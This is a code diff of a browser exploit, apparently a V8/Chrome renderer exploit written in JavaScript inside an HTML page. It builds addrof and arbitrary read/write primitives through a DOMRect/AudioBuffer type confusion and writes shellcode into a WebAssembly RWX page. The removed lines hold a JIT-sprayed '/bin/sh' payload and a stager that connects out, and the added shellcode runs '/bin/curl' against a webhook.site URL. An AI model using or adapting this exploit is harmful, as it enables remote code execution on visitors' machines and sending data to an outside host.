17, 215, 215, 68, 198, 71, 5, 115, 235, 17, 32, 32, 68, 198, 71, 6, 104, 235, 17, 106, 106, 68, 198, 71, 7, 0, 235, 17, 181, 181, 68, 106, 59, 235, 19, 1, 1, 1, 1, 68, 88, 235, 20, 78, 78, 78, 78, 78, 68, 15, 5, 235, 19, 156, 156, 156, 156, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 11, ]);
-
-// let shell_wasm_code = new Uint8Array([ 0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 142, 5, 1, 139, 5, 0, 68, 56, 121, 128, 173, 65, 17, 167, 167, 68, 176, 50, 254, 212, 34, 149, 183, 165, 68, 119, 32, 71, 132, 16, 188, 180, 163, 68, 0, 0, 0, 0, 0, 0, 0, 128, 68, 120, 130, 187, 241, 110, 247, 17, 147, 68, 0, 0, 0, 0, 0, 0, 0, 128, 68, 36, 85, 135, 82, 137, 125, 138, 161, 68, 237, 179, 221, 111, 184, 37, 16, 149, 68, 72, 49, 192, 235, 15, 167, 167, 167, 68, 72, 49, 255, 235, 15, 191, 191, 191, 68, 72, 49, 246, 235, 15, 216, 216, 216, 68, 72, 49, 210, 235, 15, 242, 242, 242, 68, 77, 49, 192, 235, 15, 13, 13, 13, 68, 106, 2, 235, 16, 41, 41, 41, 41, 68, 95, 235, 17, 70, 70, 70, 70, 70, 68, 106, 1, 235, 16, 100, 100, 100, 100, 68, 94, 235, 17, 131, 131, 131, 131, 131, 68, 106, 6, 235, 16, 163, 163, 163, 163, 68, 90, 106, 41, 235, 15, 196, 196, 196, 68, 76, 137, 225, 235, 15, 230, 230, 230, 68, 88, 15, 5, 235, 15, 9, 9, 9, 68, 73, 137, 192, 235, 15, 45, 45, 45, 68, 72, 49, 246, 235, 15, 82, 82, 82, 68, 77, 49, 210, 235, 18, 120, 120, 120, 68, 65, 82, 235, 19, 159, 159, 159, 159, 68, 198, 4, 36, 2, 235, 17, 199, 199, 68, 198, 68, 36, 1, 0, 235, 16, 240, 68, 198, 68, 36, 2, 1, 235, 16, 26, 68, 198, 68, 36, 3, 187, 235, 16, 69, 68, 198, 68, 36, 4, 127, 235, 16, 113, 68, 198, 68, 36, 5, 0, 235, 16, 158, 68, 198, 68, 36, 6, 0, 235, 16, 204, 68, 198, 68, 36, 7, 1, 235, 16, 251, 68, 72, 137, 230, 235, 18, 43, 43, 43, 68, 106, 16, 235, 19, 92, 92, 92, 92, 68, 90, 235, 20, 142, 142, 142, 142, 142, 68, 65, 80, 235, 19, 193, 193, 193, 193, 68, 95, 235, 20, 245, 245, 245, 245, 245, 68, 106, 42, 235, 19, 42, 42, 42, 42, 68, 88, 235, 20, 96, 96, 96, 96, 96, 68, 15, 5, 235, 19, 151, 151, 151, 151, 68, 72, 49, 246, 235, 18, 207, 207, 207, 68, 106, 3, 235, 19, 8, 8, 8, 8, 68, 94, 235, 20, 66, 66, 66, 66, 66, 68, 72, 255, 206, 235, 18, 125, 125, 125, 68, 106, 33, 235, 19, 185, 185, 185, 185, 68, 88, 235, 20, 246, 246, 246, 246, 246, 68, 15, 5, 235, 19, 52, 52, 52, 52, 68, 117, 162, 144, 144, 144, 144, 235, 15, 68, 72, 49, 255, 235, 18, 115, 115, 115, 68, 87, 235, 20, 179, 179, 179, 179, 179, 68, 87, 235, 20, 244, 244, 244, 244, 244, 68, 94, 235, 20, 54, 54, 54, 54, 54, 68, 90, 235, 20, 121, 121, 121, 121, 121, 68, 198, 7, 47, 235, 18, 189, 189, 189, 68, 198, 71, 1, 98, 235, 17, 2, 2, 68, 198, 71, 2, 105, 235, 17, 72, 72, 68, 198, 71, 3, 110, 235, 17, 143, 143, 68, 198, 71, 4, 47, 235, 17, 215, 215, 68, 198, 71, 5, 115, 235, 17, 32, 32, 68, 198, 71, 6, 104, 235, 17, 106, 106, 68, 198, 71, 7, 0, 235, 17, 181, 181, 68, 106, 59, 235, 19, 1, 1, 1, 1, 68, 88, 235, 20, 78, 78, 78, 78, 78, 68, 15, 5, 235, 19, 156, 156, 156, 156, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 11, ]);
-
-let shell_wasm_code = new Uint8Array( [0x6a,0x0a,0x5e,0x31,0xdb,0xf7,0xe3,0x53,0x43,0x53,0x6a,0x02,0xb0,0x66,0x89,0xe1,0xcd,0x80,0x97,0x5b,0x68,0x03,0x06,0xe7,0xc1,0x68,0x02,0x00,0x2f,0x4f,0x89,0xe1,0x6a,0x66,0x58,0x50,0x51,0x57,0x89,0xe1,0x43,0xcd,0x80,0x85,0xc0,0x79,0x19,0x4e,0x74,0x3d,0x68,0xa2,0x00,0x00,0x00,0x58,0x6a,0x00,0x6a,0x05,0x89,0xe3,0x31,0xc9,0xcd,0x80,0x85,0xc0,0x79,0xbd,0xeb,0x27,0xb2,0x07,0xb9,0x00,0x10,0x00,0x00,0x89,0xe3,0xc1,0xeb,0x0c,0xc1,0xe3,0x0c,0xb0,0x7d,0xcd,0x80,0x85,0xc0,0x78,0x10,0x5b,0x89,0xe1,0x99,0xb2,0x24,0xb0,0x03,0xcd,0x80,0x85,0xc0,0x78,0x02,0xff,0xe1,0xb8,0x01,0x00,0x00,0x00,0xbb,0x01,0x00,0x00,0x00,0xcd,0x80]);
-
-let shell_wasm_module = new WebAssembly.Module(shell_wasm_code);
-let shell_wasm_instance = new WebAssembly.Instance(shell_wasm_module);
-let shell_func = shell_wasm_instance.exports.main;
-
-shell_func();
-
-let shell_wasm_instance_addr = addrof(shell_wasm_instance);
-console.log(`shellwasm instance address: 0x${shell_wasm_instance_addr.toString(16)}`)
-let shell_wasm_rwx_addr = v8h_read64(shell_wasm_instance_addr + 0x50n);
-console.log(`shellwasm rwx address: 0x${shell_wasm_rwx_addr.toString(16)}`)
-
-// let shell_func_code_addr = shell_wasm_rwx_addr + 0xB40n;
-// let shell_code_addr = shell_wasm_rwx_addr + 0x730n;
-// let shell_code_addr = shell_wasm_rwx_addr + 0x71dn;
-let shell_code_addr = shell_wasm_rwx_addr + 0x78en;
 
 
-console.log(`shellcode address: 0x${shell_code_addr.toString(16)}`)
+var test_addrof = {};
+console.log("test_addrof");
+console.log(test_addrof);
+var test_addrof_addr = addrof(test_addrof);
 
-const tbl = new WebAssembly.Table({
-        initial: 2,
-        element: "anyfunc"
-});
+// // %SystemBreak();
+// // let wasm_instance_addr = addrof
 
-const importObject = {
-        imports: { imported_func : (n) => n + 1, },
-        js: { tbl }
-};
-
-var wasmCode = new Uint8Array([
+var wasm_code = new Uint8Array([
 0,97,115,109,1,0,0,0,
 1,15,3,96,1,124,1,124,96,2,124,124,0,96,0,1,125,
 2,36,2,7,105,109,112,111,114,116,115,13,105,109,112,111,114,116,101,100,95,102,117,
@@ -259,15 +228,139 @@ var wasmCode = new Uint8Array([
 32,0,16,0,11
 ]);
 
-let wasmModule = new WebAssembly.Module(wasmCode);
-let wasmInstance = new WebAssembly.Instance(wasmModule, importObject);
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod); 
 
-let wasmInstance_addr = addrof(wasmInstance);
-let RWX_page_pointer = v8h_read64(wasmInstance_addr+0x50n);
 
-let func_make_array = wasmInstance.exports.make_array;
+// var wasm_mod2 = new WebAssembly.Module(wasm_code);
+// var wasm_instance2 = new WebAssembly.Instance(wasm_mod2); 
+// f = wasm_instance2.exports.main;
 
-let func_main = wasmInstance.exports.main;
-wasm_write(wasmInstance_addr+0x50n, shell_code_addr);
-func_main();
+// for (let i = 0; i < 0x10000; i++) {
+//    f();
+// }
+
+var wasm_instance_addr = addrof(wasm_instance);
+
+// alert("wasm_instance_addr:");
+console.log(wasm_instance_addr.toString(16));
+console.log(wasm_instance);
+
+var target_write = (0x8n << 32n) + (wasm_instance_addr+ (0x5n * 0x10n) - 0x8n)
+leaker_pls[dd_element_idx] = itof(target_write);
+
+var rwx_address = ftoi(dd_floats[0]);
+console.log("rwx_addr:");
+console.log(rwx_address.toString(16));
+
+var offset = 0x2cbf55efa71dn-0x2cbf55efa000n;
+// var offset = REPLACE_THIS;
+// dd_floats[0] = itof(rwx_address+(offset));
+console.log("calculated: ");
+// alert((rwx_address+(offset)).toString(16));
+
+function v8_read(addr){
+    leaker_pls[dd_element_idx] = itof((0x8n << 32n) + (addr));
+    // %DebugPrint("v8_read");
+    // %DebugPrint(dd_floats);
+    var v8_leak = ftoi(dd_floats[0]);
+    v8_leak = v8_leak & 0xFFFFFFFFn;
+    console.log(`v8_leak: 0x${v8_leak.toString(16)}`)
+    return v8_leak;
+}
+
+var view = new ArrayBuffer(24);
+var dblArr = new Float64Array(view);
+var intView = new Uint32Array(view);
+var bigIntView = new BigInt64Array(view);
+
+function ftoi32(f) {
+    dblArr[0] = f;
+    return [intView[0], intView[1]];
+}
+
+function i32tof(i1, i2) {
+    intView[0] = i1;
+    intView[1] = i2;
+    return dblArr[0];
+}
+
+function v8_write(addr, value1, value2){
+    leaker_pls[dd_element_idx] = itof((0x8n << 32n) + (addr));
+    dd_floats[0] = itof((value1 << 32n) + value2);
+}
+
+function getInstance(obj) {
+  let addr = addrof(obj);
+  return v8_read(addr + 0x10n);
+}
+
+function addrOf(obj) {
+    dd_obj[0] = obj;
+    dd_obj[1] = obj;
+  var addrDbl = leaker_pls[dd_floats_idx + 12];
+  return ftoi32(addrDbl)[0];
+}
+
+function read(addr) {
+    leaker_pls[dd_element_idx] = i32tof(addr,2);
+    var out = ftoi32(dd_floats[0]);
+    return out;
+}
+
+function write(addr, val1, val2) {
+    leaker_pls[dd_element_idx] = i32tof(addr,2);
+    dd_floats[0] = i32tof(val1, val2);
+    return;
+}
+
+var domRect = new DOMRect(1.1,2.3,3.3,4.4);
+var node = new AudioBuffer({length: 3000, sampleRate: 30000, numberOfChannels : 2});
+var channel = node.getChannelData(0);
+var nodeInstance = getInstance(node);
+var channelAddr = addrOf(channel);
+var channelInstance = read(channelAddr + 0x3c);
+var rectAddr = addrOf(domRect);
+var rectInstance = read(rectAddr + 0x10);
+var rectType = read(rectAddr + 0x8);
+console.log(`rectAddr: 0x${rectAddr.toString(16)}`);
+console.log(`rectInstance: 0x${rectInstance.toString(16)}`);
+
+
+write(rectAddr + 0x10, rectType[0], rectType[1]);
+//V8DOMRectReadOnly18wrapper_type_info_E
+var typeInfo = ftoi32(domRect.width);
+//Confusion between DOMRect and DOMArrayBuffer allows raw_base_addr_ ptr to be overwritten, causing arbitrary rw
+write(rectAddr + 0x10, channelInstance[0], channelInstance[1]);
+var rawBase = ftoi32(domRect.x);
+var trustedBase = itof(rwx_address);
+//Set address to read and write
+domRect.x = trustedBase;
+
+// Create an ArrayBuffer with a size in bytes
+
+
+
+
+var shellcode = [0x48, 0xB8, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x99, 0x50, 0x54, 0x5F, 0x52, 0x66, 0x68, 0x2D, 0x63, 0x54, 0x5E, 0x52, 0xE8, 0x44, 0x00, 0x00, 0x00, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x63, 0x75, 0x72, 0x6C, 0x20, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3A, 0x2F, 0x2F, 0x77, 0x65, 0x62, 0x68, 0x6F, 0x6F, 0x6B, 0x2E, 0x73, 0x69, 0x74, 0x65, 0x2F, 0x66, 0x33, 0x63, 0x63, 0x33, 0x34, 0x65, 0x39, 0x2D, 0x33, 0x36, 0x37, 0x39, 0x2D, 0x34, 0x62, 0x30, 0x31, 0x2D, 0x39, 0x32, 0x31, 0x33, 0x2D, 0x33, 0x37, 0x35, 0x62, 0x33, 0x64, 0x61, 0x33, 0x66, 0x33, 0x62, 0x33, 0x00, 0x56, 0x57, 0x54, 0x5E, 0x6A, 0x3B, 0x58, 0x0F, 0x05]
+
+
+const buffer = new ArrayBuffer(0x1000);
+var view2 = new DataView(buffer);
+const uint8 = new Uint8Array(buffer);
+var floatArray2 = new Float32Array(buffer)
+
+for (i = 0; i < shellcode.length; i++)
+    view2.setUint8(i, shellcode[i]);
+
+//copyFromChannel and copyToChannel can then be used for arbitrary rw
+// node.copyFromChannel(dst, 0, 0);
+node.copyToChannel(floatArray2,0, 0);
+
+f = wasm_instance.exports.main;
+f();
+// f();
+
 </script>
+
+</html>
